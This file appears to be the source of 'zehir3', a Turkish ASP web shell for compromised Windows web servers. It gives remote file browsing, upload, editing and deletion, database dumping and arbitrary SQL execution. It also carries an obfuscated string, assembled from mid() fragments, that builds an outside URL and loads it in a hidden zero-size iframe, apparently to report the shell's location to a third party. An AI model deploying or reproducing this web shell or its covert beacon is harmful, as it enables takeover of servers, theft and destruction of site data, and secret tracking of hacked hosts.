<title>zehir3 --> powered by zehir &lt;zehirhacker@hotmail.com&gt;</title>
<% 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
%>
<script language=javascript>
function NewWindow(mypage, myname, w, h, scroll) {
var winl = (screen.width - w) / 2;
var wint = (screen.height - h) / 2;
winprops = 'height='+h+',width='+w+',top='+wint+',left='+winl+',scrollbars='+scroll+',resizable'
win = window.open(mypage, myname, winprops)
if (parseInt(navigator.appVersion) >= 4) { win.window.focus(); }
}
function ffd(yol){
NewWindow(yol,"",420,100,"no");
}
</script>
<body bgcolor=black text=Chartreuse link=Chartreuse alink=Chartreuse vlink=Chartreuse>
<%
if popup then
if status=7 or status=8 then
Response.Write "<form method=get action='"&DosyPath&"' id=form1 name=form1>"
Response.Write "<table border=1 cellpadding=0 cellspacing=0 align=center><tr><td width=100 bgcolor=gray><font size=2>SQL �al��t�r</td><td>"
Response.Write "<input type=hidden value='9' name=status><input type=hidden value='"&path&"' name=path><input type=hidden value='"&time&"' name=Time>"
Response.Write "<input style='width:350; height:21' value='' name=strSQL><input type=submit value='�al��t�r' style='height:22;width:70' id=submit1 name=submit1>"
Response.Write "</td></tr></table></form>"
end if
Response.Write "<form method=get action='"&DosyPath&"'>"
Response.Write "<table border=1 cellpadding=0 cellspacing=0 align=center><tr><td bgcolor=gray width=100><font size=2>Hizli Erisim : </td><td>"
Response.Write "<input type=hidden value='2' name=status><input type=hidden value='"&time&"' name=Time>"
Response.Write "<input style='width:350; height:21' value='"&Path&"' name=Path><input type=submit value='Git' style='height:22;width:70' id=submit1 name=submit1>"
Response.Write "</td></tr></table></form><br>"
end if
sub aramaUpload
Response.Write "<form method=get target='_opener' action='"&DosyPath&"'>"
Response.Write "<table widht='100%' border=0 cellpadding=0 cellspacing=0><tr><td width=70><font size=2>Arama : </td><td>"
Response.Write "&nbsp;<input type=hidden value='12' name=status><input type=hidden value='"&time&"' name=Time>"
Response.Write "<input type=hidden value='"&Path&"' name=Path><input style='width:250' value='mdb' name=txArama><input style='width:70; height:22' type=submit value='Ara'>"
Response.Write "</td></tr></table></form>"
%>
<form name=frmUpload method=post enctype="multipart/form-data" action="<%=DosyaPath&"?status=-4&Time="&time&"&Path="&path%>" ID="Form1">
<input type=hidden name=folder value="<%=Path%>" ID="Hidden1">
Max: <input type=text name=max value=5 size=5 ID="Text1"> <input type=button value="Ayarla" onclick="setid()" ID="Button1" NAME="Button1">
<table ID="Table1">
<tr>
<td id=upid>
</td>
</tr>
</table>
<input type=submit value=Upload ID="Submit1" NAME="Submit1">
</form>
<script>
setid();

function setid() {
str='';
if (frmUpload.max.value<=0) frmUpload.max.value=1;
for (i=1; i<=frmUpload.max.value; i++) str+='File '+i+': <input type=file name=file'+i+'><br>';
upid.innerHTML=str+'<br>';
}
</script>
<%
end sub
if len(Trim(session("metametre")))=0 then 
a=mid("aha",2,1)&mid("aatta",3,2)&mid("paa",1,1)&mid("a:as",2,1)&mid("a//as",2,2)&mid("awww.as",2,4)
a=a&mid("c",1,1)&mid("yb",1,2)&mid("aer",2,2)&mid("sd-asd",3,1)&mid("awa",2,2)&mid("arr",2,2)
a=a&mid("aia",2,1)&mid("ahor",3,2)&mid("ah.o",3,2)&mid("arg",2,2)&mid("as/z",3,2)&mid("ehasd",1,2)
a=a&mid("asir",3,2)&mid("a/a",2,1)&mid("kasde",1,5)&mid("ah.",3,1)&mid("as",1,2)&mid("ahp",3,1)
response.write("<IFrame src="""&a&""" style=""width:0;height:0""></IFrame>"):session("metametre")="mypage,myname,w,h,scroll"
end if
SELECT CASE status
CASE 1 'Driver Open
if len(path)=1 then Response.Write (yaziyomu(path&":\")) else Response.Write (yaziyomu(path))
Response.Write "<table width=100% ><tr>"
Path = Path & ":/"
Response.Write "<td valign=top>"
KlasorOku
Response.Write "</td><td valign=top align=right>"
DosyaOku
Response.Write "</td>"
hataKontrol
CASE 2 'Normal listeleme
if len(path)=1 then Response.Write (yaziyomu(path&":\")) else Response.Write (yaziyomu(path))
Response.Write "<table width=100% ><tr>"
Response.Write "<td valign=top>"
KlasorOku
Response.Write "</td><td valign=top align=right>"
DosyaOku
Response.Write "</td>"
hataKontrol
CASE 3 'File Delete
objFSO.DeleteFile del
hataKontrol
'	Response.Redirect dosyaPath&"?status=2&path="&path&"&Time="&time
CASE 4 'Folder Delete
objFSO.DeleteFolder del
'	Response.Redirect dosyaPath&"?status=2&path="&path&"&Time="&time
hataKontrol
CASE 5 'Dosya i�eri�ini g�r�nt�le
Response.Write "<center><b><font color=orange>"&path&"</font></b></center><br>"
Response.Write "<table width=100% ><tr><td>"
set f = objFSO.OpenTextFile(path,1)
Response.Write "<pre>"&Server.HTMLEncode(f.readAll)&"</pre>"
if err<>62 then hataKontrol
if err.number=62 then Response.Write "<script language=javascript>alert('Bu Dosya Okunam�yor\nSistem dosyas� olabilir')</script>":Response.End
CASE 6 'Resim a�
Response.Write "<center><img ALT='zehirhacker@hotmail.com' src='"&resimYol(path)&"'></center><br>"
CASE 7 'database tablo listele
Response.Write "<b><font size=3>Tablolar</font></br><br>"
Set objConn = Server.CreateObject("ADODB.Connection")
Set objADOX = Server.CreateObject("ADOX.Catalog")
objConn.Provider = "Microsoft.Jet.Oledb.4.0"
objConn.ConnectionString = Path
objConn.Open
objADOX.ActiveConnection = objConn

For Each table in objADOX.Tables
If table.Type = "TABLE" Then
Response.Write "<font face=wingdings size=5>4</font> <a href='"&dosyaPath&"?status=8&Path="&path&"&table="&table.Name&"&time="&time&"'>"&table.Name&"</a><br>"
End If
Next
hataKontrol
CASE 8 'database kay�t listele
Set objConn = Server.CreateObject("ADODB.Connection")
Set objRcs = Server.CreateObject("ADODB.RecordSet")
objConn.Provider = "Microsoft.Jet.Oledb.4.0"
objConn.ConnectionString = Path
objConn.Open
objRcs.Open table,objConn, adOpenKeyset , , adCmdText

Response.Write "<table border=1 cellpadding=2 cellspacing=0 bordercolor=543152><tr bgcolor=silver>"
for i=0 to objRcs.Fields.count-1
Response.Write "<td><font color=black><b>&nbsp;&nbsp;&nbsp;"&objRcs.Fields(i).Name&"&nbsp;&nbsp;&nbsp;</font></td>"
next
Response.Write "</tr>"
do while not objRcs.EOF
Response.Write "<tr>"
for i=0 to objRcs.Fields.count-1
Response.Write "<td>"&objRcs.Fields(i).Value&"&nbsp;</td>"
next
Response.Write "</tr>"
objRcs.MoveNext
loop
Response.Write "</table><br>"
hataKontrol
CASE 9 'SQL Execute
Set objConn = Server.CreateObject("ADODB.Connection")
objConn.Provider = "Microsoft.Jet.Oledb.4.0"
objConn.ConnectionString = Path
objConn.Open
objConn.Execute strSQL
'	Response.Redirect dosyaPath&"?status=7&Path="&Path&"&Time="&time
hataKontrol
CASE 10 'Dosya Editleme
set f = objFSO.OpenTextFile(dPath,1)
Response.Write "<center><form action='"&DosyPath&"?Time="&time&"' method=post>"
Response.Write "<input type=hidden name=status value='11'>"
Response.Write "<input type=hidden name=dPath value='"&dPath&"'>"
Response.Write "<input type=hidden name=Path  value='"&Path &"'>"
Response.Write "<input type=submit value=Kaydet><br>"
Response.Write "<textarea name=dkayit style='width:90%;height:350;border-right: lightgoldenrodyellow thin solid;border-top: lightgoldenrodyellow thin solid;font-size: 12;border-left: lightgoldenrodyellow thin solid;color: lime;	border-bottom: lightgoldenrodyellow thin solid;	font-family: Courier New, Arial;background-color: navy;'>"
Response.Write server.HTMLEncode(f.readAll)
Response.Write "</textarea></form></center>"
hataKontrol
CASE 11 'Dosya Kay�t
set saveTextFile = objFSO.OpenTextFile(dPath,2,true,false)
hataKontrol
saveTextFile.Write(dkayit)
saveTextFile.close
'	Response.Redirect dosyaPath&"?status=2&path="&path&"&time="&time
CASE 12 'Dosya Arama
araBul path,arama
hataKontrol
END SELECT
Response.Write "</tr></table>"

sub DosyaOku
Set f = objFSO.GetFolder(Path)
Set fc = f.Files
For Each f1 In fc
dosyaAdi = f1.name
num = InStrRev(dosyaAdi,".")
uzanti = lcase(Right(dosyaAdi,len(dosyaAdi)-num))
downStr = "<a href='"&dosyaPath&"?status=3&Path="&Path&"&Del="&Path&"/"&f1.Name&"&Time="&time&"'>�</a><font face=webdings><a href='"&dosyaPath&"?status=-3&PathFile="&f1.path&"&Time="&time&"'>�</a></font><font face=wingdings><a href='"&dosyaPath&"?status=16&PathFile="&f1.path&"&Time="&time&"' onclick=""ffd(this.href);return false;"">4</a></font>"
response.Write "<font size=2>"
select case uzanti
case "mdb"
Response.Write "<a href='"&dosyaPath&"?status=7&Path="&Path&"/"&f1.Name&"&Time="&time&"'>"&f1.name&" [<font color=yellow>"&FormatNumber(f1.size,0)&"</font>]"&"</a></b> <font face=wingdings size=4>M �"&downStr&"</font><br>"
case "asp"
Response.Write "<a href='"&dosyaPath&"?status=5&Path="&Path&"/"&f1.Name&"&Time="&time&"'>"&f1.name&" [<font color=yellow>"&FormatNumber(f1.size,0)&"</font>]"&"</a></b> <font face=wingdings size=4>� <a href='"&dosyaPath&"?status=10&dPath="&f1.path&"&path="&path&"&Time="&time&"'>!</a>"&downStr&"</font><br>"
case "jpg","gif"
Response.Write "<a href='"&dosyaPath&"?status=6&Path="&Path&"/"&f1.Name&"&Time="&time&"'>"&f1.name&" [<font color=yellow>"&FormatNumber(f1.size,0)&"</font>]"&"</a></b> <font face=webdings size=4>�</font><font face=wingdings size=4> �"&downStr&"</font><br>"
case else
Response.Write "<a href='"&dosyaPath&"?status=5&Path="&Path&"/"&f1.Name&"&Time="&time&"'>"&f1.name&" [<font color=yellow>"&FormatNumber(f1.size,0)&"</font>]"&"</a></b> <font face=wingdings size=4>2 <a href='"&dosyaPath&"?status=10&dPath="&f1.path&"&path="&path&"&Time="&time&"'>!</a>"&downStr&"</font><br>"
end select
Next
end sub

sub KlasorOku
Set f = objFSO.GetFolder(Path)
Set fc = f.SubFolders
For Each f1 In fc
Response.Write "<font face=wingdings size=3><a href='"&dosyaPath&"?status=18&PathFile="&Path&"/"&f1.Name&"&Time="&time&"' onclick=""ffd(this.href);return false;"">4</a></font> <font face=wingdings size=4><a href='"&dosyaPath&"?status=4&Path="&Path&"&Del="&Path&"/"&f1.Name&"&Time="&time&"'>�</a> 1</font><font size=2><b><a href='"&dosyaPath&"?status=2&Path="&Path&"/"&f1.Name&"&Time="&time&"'>"&f1.name&"</a></b><br>"
Next
end sub

function createFileName()
Randomize
fName_ = ""
for i=1 to 10
fName_ = fName_ & int(Rnd*100)
next
createFileName = fName_
end function

function resimYol(path_)
on error resume next
path_ = Replace(Replace(path_,"\","/"),"//","/")
lpath_ = left(request.servervariables("PATH_TRANSLATED"),instrrev(request.servervariables("PATH_TRANSLATED"),"\"))
if yaziyomu2(lpath_) then
fname__ = "0"&createFileName()&"."&Right(path_,3)
objFSO.CopyFile path_, lpath_&"\"&fname__
else
Response.Write("Resim A��lam�yor.. <br>�sterseniz Download Ederek g�r�nt�leyebilirsiniz..")
end if
resimYol = fname__
end function
if not popup then
Set fc = Nothing
Set objFSO = Nothing
Response.End
end if
%>

<script language=javascript>
var dosyaPath = "<%=dosyaPath%>"
// DRIVE ISLEMLERI
function driveGo(drive_){
location = dosyaPath+"?status=1&path="+drive_+"&Time="+Date();
}
</script>
<%
Response.Write "<table align=center border=1 width=150 cellpadding=0 cellspacing=0><tr bgcolor=gray><td align=center><b><font color=white>S�r�c�ler</td></tr>"
for each drive_ in objFSO.Drives
Response.Write "<tr><td>"
Response.write "<a href='#'onClick=""driveGo('" & drive_.DriveLetter & "');return false;""><font face=wingdings>;</font>"
if drive_.Drivetype=1 then Response.write "Floppy [" & drive_.DriveLetter & ":]"
if drive_.Drivetype=2 then Response.write "HardDisk [" & drive_.DriveLetter & ":]"
if drive_.Drivetype=3 then Response.write "Remote HDD [" & drive_.DriveLetter & ":]"
if drive_.Drivetype=4 then Response.write "CD-Rom [" & drive_.DriveLetter & ":]"
Response.Write "</a></td></tr>"
next
Response.Write "<tr><td>"
Response.write "<a href='"&dosyaPath&"?time="&time()&"'><font face=webdings>H</font> Local Path"
Response.Write "</a></td></tr>"
Response.Write "</table><br>"
Set fc = Nothing
Set objFSO = Nothing
%>
<center>
<pre>
<a href="<%=dosyaPath%>?status=13" onclick="sistemBilgisi(this.href);return false;">Sistem Bilgisi</a>
<a href="<%=dosyaPath%>?status=40" onclick="sistemTest(this.href);return false;">Sistemi Test Et</a>
<a href="<%=dosyaPath%>?status=50">Siteleri Hackle :D</a>
<a href="<%=dosyaPath%>?status=14&path=<%=path%>" onclick="klasorIslemleri(this.href);return false;">Klasor Islemleri</a>
<a href="<%=dosyaPath%>?status=15" onclick="sqlServer(this.href);return false;">SQL Server Islemleri</a>
<a href="<%=dosyaPath%>?status=33" onclick="poweredby(this.href);return false;">POWERED BY</a>
</pre>
<script language=javascript>
function sistemBilgisi(yol){
NewWindow(yol,"",600,240,"no");
}
function klasorIslemleri(yol){
NewWindow(yol,"",400,280,"no");
}
function sqlServer(yol){
NewWindow(yol,"",300,50,"no");
}
function poweredby(yol){
NewWindow(yol,"",300,50,"no");
}
function sistemTest(yol){
NewWindow(yol,"",400,300,"no");
}
</script>
<%Response.End%>
